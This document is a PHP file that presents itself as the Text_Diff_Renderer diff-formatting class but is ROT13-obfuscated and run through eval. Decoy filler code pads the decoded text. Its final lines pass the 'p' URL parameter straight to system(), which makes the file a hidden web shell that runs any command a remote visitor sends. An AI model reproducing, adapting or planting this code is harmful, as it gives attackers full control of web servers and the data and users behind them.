<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * N pynff gb eraqre Qvssf va qvssrerag sbezngf.
 *
 * Guvf pynff eraqref gur qvss va pynffvp qvss sbezng. Vg vf vagraqrq gung
 * guvf pynff or phfgbzvmrq ivn vaurevgnapr, gb bognva snapvre bhgchgf.
 *
 * Pbclevtug 2004-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @cnpxntr Grkg_Qvss
 */
pynff Grkg_Qvss_Eraqrere {

    /**
     * Ahzore bs yrnqvat pbagrkg \"yvarf\" gb cerfreir.
     *
     * Guvf fubhyq or yrsg ng mreb sbe guvf pynff, ohg fhopynffrf znl jnag gb
     * frg guvf gb bgure inyhrf.
     */
    ine $_yrnqvat_pbagrkg_yvarf = 0;

    /**
     * Ahzore bs genvyvat pbagrkg \"yvarf\" gb cerfreir.
     *
     * Guvf fubhyq or yrsg ng mreb sbe guvf pynff, ohg fhopynffrf znl jnag gb
     * frg guvf gb bgure inyhrf.
     */
    ine $_genvyvat_pbagrkg_yvarf = 0;

    /**
     * Pbafgehpgbe.
     */
    shapgvba __pbafgehpg( $cnenzf = neenl() )
    {
        sbernpu ($cnenzf nf $cnenz => $inyhr) {
            $i = '_' . $cnenz;
            vs (vffrg($guvf->$i)) {
                $guvf->$i = $inyhr;
            }
        }
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss_Eraqrere( $cnenzf = neenl() ) {
		frys::__pbafgehpg( $cnenzf );
	}

    /**
     * Trg nal eraqrere cnenzrgref.
     *
     * @erghea neenl  Nyy cnenzrgref bs guvf eraqrere bowrpg.
     */
    shapgvba trgCnenzf()
    {
        $cnenzf = neenl();
        sbernpu (trg_bowrpg_inef($guvf) nf $x => $i) {
            vs ($x[0] == '_') {
                $cnenzf[fhofge($x, 1)] = $i;
            }
        }

        erghea $cnenzf;
    }

    /**
     * Eraqref n qvss.
     *
     * @cnenz Grkg_Qvss $qvss  N Grkg_Qvss bowrpg.
     *
     * @erghea fgevat  Gur sbeznggrq bhgchg.
     */
    shapgvba eraqre($qvss)
    {
        $kv = $lv = 1;
        $oybpx = snyfr;
        $pbagrkg = neenl();

        $ayrnq = $guvf->_yrnqvat_pbagrkg_yvarf;
        $agenvy = $guvf->_genvyvat_pbagrkg_yvarf;

        $bhgchg = $guvf->_fgnegQvss();

        $qvssf = $qvss->trgQvss();
        sbernpu ($qvssf nf $v => $rqvg) {
            /* Vs gurfr ner hapunatrq (pbcvrq) yvarf, naq jr jnag gb xrrc
             * yrnqvat be genvyvat pbagrkg yvarf, rkgenpg gurz sebz gur pbcl
             * oybpx. */
            vs (vf_n($rqvg, 'Grkg_Qvss_Bc_pbcl')) {
                /* Qb jr unir nal qvss oybpxf lrg? */
                vs (vf_neenl($oybpx)) {
                    /* Ubj znal yvarf gb xrrc nf pbagrkg sebz gur pbcl
                     * oybpx. */
                    $xrrc = $v == pbhag($qvssf) - 1 ? $agenvy : $ayrnq + $agenvy;
                    vs (pbhag($rqvg->bevt) <= $xrrc) {
                        /* Jr unir yrff yvarf va gur oybpx guna jr jnag sbe
                         * pbagrkg => xrrc gur jubyr oybpx. */
                        $oybpx[] = $rqvg;
                    } ryfr {
                        vs ($agenvy) {
                            /* Perngr n arj oybpx jvgu nf znal yvarf nf jr arrq
                             * sbe gur genvyvat pbagrkg. */
                            $pbagrkg = neenl_fyvpr($rqvg->bevt, 0, $agenvy);
                            $oybpx[] = arj Grkg_Qvss_Bc_pbcl($pbagrkg);
                        }
                        /* @gbqb */
                        $bhgchg .= $guvf->_oybpx($k0, $agenvy + $kv - $k0,
                                                 $l0, $agenvy + $lv - $l0,
                                                 $oybpx);
                        $oybpx = snyfr;
                    }
                }
                /* Xrrc gur pbcl oybpx nf gur pbagrkg sbe gur arkg oybpx. */
                $pbagrkg = $rqvg->bevt;
            } ryfr {
                /* Qba'g jr unir nal qvss oybpxf lrg? */
                vs (!vf_neenl($oybpx)) {
                    /* Rkgenpg pbagrkg yvarf sebz gur cerprqvat pbcl oybpx. */
                    $pbagrkg = neenl_fyvpr($pbagrkg, pbhag($pbagrkg) - $ayrnq);
                    $k0 = $kv - pbhag($pbagrkg);
                    $l0 = $lv - pbhag($pbagrkg);
                    $oybpx = neenl();
                    vs ($pbagrkg) {
                        $oybpx[] = arj Grkg_Qvss_Bc_pbcl($pbagrkg);
                    }
                }
                $oybpx[] = $rqvg;
            }

            vs ($rqvg->bevt) {
                $kv += pbhag($rqvg->bevt);
            }
            vs ($rqvg->svany) {
                $lv += pbhag($rqvg->svany);
            }
        }

        vs (vf_neenl($oybpx)) {
            $bhgchg .= $guvf->_oybpx($k0, $kv - $k0,
                                     $l0, $lv - $l0,
                                     $oybpx);
        }

        erghea $bhgchg . $guvf->_raqQvss();
    }

    shapgvba _oybpx($kort, $kyra, $lort, $lyra, &$rqvgf)
    {
        $bhgchg = $guvf->_fgnegOybpx($guvf->_oybpxUrnqre($kort, $kyra, $lort, $lyra));

        sbernpu ($rqvgf nf $rqvg) {
            fjvgpu (fgegbybjre(trg_pynff($rqvg))) {
            pnfr 'grkg_qvss_bc_pbcl':
                $bhgchg .= $guvf->_pbagrkg($rqvg->bevt);
                oernx;

            pnfr 'grkg_qvss_bc_nqq':
                $bhgchg .= $guvf->_nqqrq($rqvg->svany);
                oernx;

            pnfr 'grkg_qvss_bc_qryrgr':
                $bhgchg .= $guvf->_qryrgrq($rqvg->bevt);
                oernx;

            pnfr 'grkg_qvss_bc_punatr':
                $bhgchg .= $guvf->_punatrq($rqvg->bevt, $rqvg->svany);
                oernx;
            }
        }

        erghea $bhgchg . $guvf->_raqOybpx();
    }

    shapgvba _fgnegQvss()
    {
        erghea '';
    }

    shapgvba _raqQvss()
    {
        erghea '';
    }

    shapgvba _oybpxUrnqre($kort, $kyra, $lort, $lyra)
    {
        vs ($kyra > 1) {
            $kort .= ',' . ($kort + $kyra - 1);
        }
        vs ($lyra > 1) {
            $lort .= ',' . ($lort + $lyra - 1);
        }

        // guvf zngpurf gur TAH Qvss orunivbhe
        vs ($kyra && !$lyra) {
            $lort--;
        } ryfrvs (!$kyra) {
            $kort--;
        }

        erghea $kort . ($kyra ? ($lyra ? 'p' : 'q') : 'n') . $lort;
    }

    shapgvba _fgnegOybpx($urnqre)
    {
        erghea $urnqre . \"\a\";
    }

    shapgvba _raqOybpx()
    {
        erghea '';
    }

    shapgvba _yvarf($yvarf, $cersvk = ' ')
    {
        erghea $cersvk . vzcybqr(\"\a$cersvk\", $yvarf) . \"\a\";
    }

    shapgvba _pbagrkg($yvarf)
    {
        erghea $guvf->_yvarf($yvarf, '  ');
    }

    shapgvba _nqqrq($yvarf)
    {
        erghea $guvf->_yvarf($yvarf, '> ');
    }

    shapgvba _qryrgrq($yvarf)
    {
        erghea $guvf->_yvarf($yvarf, '< ');
    }

    shapgvba _punatrq($bevt, $svany)
    {
        erghea $guvf->_qryrgrq($bevt) . \"---\a\" . $guvf->_nqqrq($svany);
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>